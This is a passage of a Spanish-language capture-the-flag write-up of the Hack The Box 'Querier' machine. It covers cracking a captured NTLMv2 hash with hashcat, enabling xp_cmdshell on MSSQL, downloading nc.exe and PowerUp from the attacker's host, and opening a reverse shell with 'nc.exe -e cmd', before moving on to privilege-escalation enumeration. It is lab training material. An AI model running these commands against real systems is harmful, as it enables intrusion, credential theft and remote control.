&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478&#34;&gt;&lt;strong&gt;CAPTURE MSSQL CREDENTIALS WITH SMBSERVER&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/querier/Screenshot_20190220_230209.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;hashcat&#34;&gt;Hashcat&lt;/h4&gt;
&lt;p&gt;Utilizamos hashcat para desencriptar.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;5600&lt;/span&gt; -o querier.txt ntlm.txt ../rockyou.txt

mssql-svc::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;decrypted&#34;&gt;DECRYPTED&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;MSSQL-SVC::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000:corporate568
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---flag&#34;&gt;USER - FLAG&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python mssqlclient.py -p &lt;span class=&#34;m&#34;&gt;1433&lt;/span&gt; -windows-auth -debug MSSQL-SVC:&lt;span class=&#34;s1&#34;&gt;&amp;#39;corporate568&amp;#39;&lt;/span&gt;@10.10.10.125
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ya que obtuvimos usuario y contraseña de podemos utilizarlos y activar &lt;code&gt;xp_cmdshell&lt;/code&gt; para ejecutar comando dentro de la computadora.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sp_configure&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;show advanced options&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sp_configure&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;reconfigure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sp_configure&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;xp_cmdshell&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sp_configure&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;reconfigure&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecutando comandos, leyendo el flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;EXEC master.dbo.xp_cmdshell &lt;span class=&#34;s1&#34;&gt;&amp;#39;more C:\Users\mssql-svc\Desktop\user.txt&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
output                                                                                                                                                                                                                                                           
--------------------------------------
c37b41bb669da345bb14de50faab3c16
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;shell-inversa---netcat&#34;&gt;SHELL INVERSA - NETCAT&lt;/h4&gt;
&lt;p&gt;Utilizando powershell para descargar &lt;code&gt;nc.exe&lt;/code&gt; (netcat) en la computadora.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;n&#34;&gt;EXEC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;powershell -command &amp;#34;&amp;amp; { iwr 10.10.12.33/nc.exe -OutFile C:\Users\mssql-svc\Desktop\nc.exe }&amp;#34;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando nc.exe (netcat) para conectarnos de forma inversa a nuestro puerto local&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;EXEC&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;master&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dbo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xp_cmdshell&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\Users\mssql-svc\Desktop\nc.exe -e cmd 10.10.12.33 7878&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;local-1&#34;&gt;Local&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;nc -lvp &lt;span class=&#34;m&#34;&gt;7878&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Estando dentro de la maquina como &lt;code&gt;MSSQL-SVC&lt;/code&gt; procedemos a hacer una enumeracion con &lt;code&gt;PowerUp&lt;/code&gt; el cual es un script escrito en powershell para enumerar los diferentes vectores de ataque para escalar privilegios en windows.&lt;/p&gt;
&lt;h4 id=&#34;powerup&#34;&gt;PowerUp&lt;/h4&gt;
&lt;p&gt;Descargamos, importamos PowerUp y hacemos una enumeracion de todas las funciones que contiene.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc&#34;&gt;&lt;strong&gt;PowerUp.ps1&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-command&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp; { iwr 10.10.12.33/power.ps1 -OutFile C:\Users\mssql-svc\Desktop\power.ps1 }&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;power&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ps1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Invoke-AllChecks&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-File&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Encoding&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ASCII&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;checks&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;txt&lt;/span&gt;


&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Running&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Invoke-AllChecks&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;local&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;group &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;administrative&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;privileges&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unquoted&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;executable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argument&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;permissions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;service&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;permissions&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;potentially&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;hijackable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;DLL&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;locations&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;ModifiablePath&lt;/span&gt;    &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;mssql-svc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AppData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsApps&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;IdentityReference&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;QUERIER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;mssql-svc&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;Permissions&lt;/span&gt;       &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WriteOwner&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Delete&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WriteAttributes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Synchronize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;%&lt;/span&gt;            &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;mssql-svc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AppData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Microsoft&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WindowsApps&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;AbuseFunction&lt;/span&gt;     &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Write-HijackDll&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-DllPath&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll&amp;#39;&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AlwaysInstallElevated&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;registry&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Autologon&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;credentials&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;registry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;modifidable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;registry&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;autoruns&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;modifiable&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;schtask&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;[*]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Checking&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;unattended&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;install&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;files&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;UnattendPath&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Panther&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Unattend&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;xml&lt;/span&gt;

